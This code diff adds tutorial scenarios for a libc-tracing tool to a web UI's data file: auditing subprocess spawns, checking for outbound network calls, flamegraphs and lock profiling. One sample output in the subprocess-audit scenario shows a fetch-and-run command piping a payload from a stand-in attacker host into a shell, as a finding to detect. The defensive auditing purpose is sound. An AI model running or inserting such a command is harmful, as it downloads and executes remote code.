@@ -485,6 +485,124 @@ EOF`,
       },
     ],
   },
+  {
+    id: "auditexec",
+    title: "Audit system() and execve() calls",
+    icon: "⚠️",
+    accent: "break",
+    summary: "Find every shell command and subprocess a binary spawns — critical for setuid and CGI audits.",
+    minutes: 3,
+    steps: [
+      {
+        what: "Trace every process-spawning libc call. Capture to a log so you can replay.",
+        cmd: "retrace trace system,popen,execve,execvp,execl --log /tmp/exec.json -- ./your-binary",
+        out: "(binary runs; every subprocess invocation is captured with its full argument list)",
+      },
+      {
+        what: "Pretty-print to see what got spawned:",
+        cmd: "retrace pp /tmp/exec.json",
+        out: "system       3 calls\n  system(cmd=sh -c 'curl http://evil.example/payload | sh')\n  ...\nexecve      12 calls\n  execve(argv=[/bin/sh, -c, ...])\n  ...",
+      },
+      {
+        what: "Any system() call with shell metacharacters, user-controlled input, or absolute paths to /tmp is a finding. CWE-78 (OS Command Injection).",
+        out: "",
+      },
+      {
+        what: "If the binary is setuid or runs as a server, every finding is potentially exploitable. File a CVE-worthy report.",
+        out: "",
+      },
+    ],
+  },
+  {
+    id: "airgap",
+    title: "Verify a binary makes no outbound network calls",
+    icon: "🔒",
+    accent: "see",
+    summary: "Confirm a binary is genuinely offline — no telemetry, no auto-update, no phone-home.",
+    minutes: 4,
+    steps: [
+      {
+        what: "Trace every network-related libc function. Empty log = no outbound calls.",
+        cmd: "retrace trace connect,send,sendto,sendmsg,write --log /tmp/net.json -- ./your-binary",
+        out: "(binary runs to completion; log captures any network activity)",
+      },
+      {
+        what: "Check the log is empty (or only contains expected calls):",
+        cmd: "retrace pp /tmp/net.json",
+        out: "(if empty: the binary made zero outbound calls — confirmed airgapped)",
+      },
+      {
+        what: "If you see unexpected connects, examine the destination addresses in the trace:",
+        cmd: "grep connect /tmp/net.json",
+        out: "{'func':'connect','args':{'addr':'93.184.216.34:443'}, ...}  ← unexpected",
+      },
+      {
+        what: "To enforce airgap going forward (not just observe), pair with the sandbox action to deny connect outright. See tutorial #3.",
+        out: "",
+      },
+    ],
+  },
+  {
+    id: "flamegraph",
+    title: "Generate a flamegraph of libc calls",
+    icon: "🔥",
+    accent: "control",
+    summary: "Visualize which libc calls dominate — the SVG bar chart every performance investigation needs.",
+    minutes: 5,
+    steps: [
+      {
+        what: "Trace every call with timing. The log will include call_duration_us per call.",
+        cmd: "retrace trace --log /tmp/trace.json -- ./your-program",
+        out: "",
+      },
+      {
+        what: "Use the bundled flamegraph tool to convert the JSON log into an SVG:",
+        cmd: "python3 tools/flamegraph/flamegraph.py /tmp/trace.json > /tmp/flame.svg",
+        out: "(writes a self-contained SVG bar chart)",
+      },
+      {
+        what: "Open the SVG in a browser.",
+        cmd: "open /tmp/flame.svg",
+        out: "(widest bars = the libc calls that consumed the most total time)",
+      },
+      {
+        what: "Search inside the SVG for a specific function name to find its slice. Click any slice to zoom.",
+        out: "(flamegraph is interactive — explore to find your hot path)",
+      },
+      {
+        what: "Requires Python 3 only for the visualization step. The trace itself is pure C; the flamegraph is just one way to render the JSON log.",
+        out: "",
+      },
+    ],
+  },
+  {
+    id: "locks",
+    title: "Profile lock contention",
+    icon: "🔒",
+    accent: "see",
+    summary: "Find which mutexes your threads are fighting over — without perf or DTrace.",
+    minutes: 4,
+    steps: [
+      {
+        what: "Trace every pthread mutex call with timing. Lock/unlock pairs reveal contention.",
+        cmd: "retrace trace pthread_mutex_lock,pthread_mutex_unlock --log /tmp/locks.json -- ./your-threaded-program",
+        out: "(program runs; every lock/unlock is captured with duration)",
+      },
+      {
+        what: "Find the slowest lock acquisitions (long duration = high contention):",
+        cmd: "retrace pp /tmp/locks.json | grep -E 'mutex' | head -5",
+        out: "pthread_mutex_lock     842 calls   487.3ms total\npthread_mutex_unlock    842 calls     2.1ms total",
+      },
+      {
+        what: "Total lock time minus total unlock time = time spent waiting. The function with the biggest gap is your bottleneck.",
+        out: "487.3ms - 2.1ms = 485.2ms of contention (out of how much wall time?)",
+      },
+      {
+        what: "For finer detail (which call site is contended), pair with a debugger or use the return-address routing pattern (cookbook recipe 17, planned).",
+        out: "",
+      },
+    ],
+  },
 ];
 
 const selectedId = ref(scenarios[0].id);
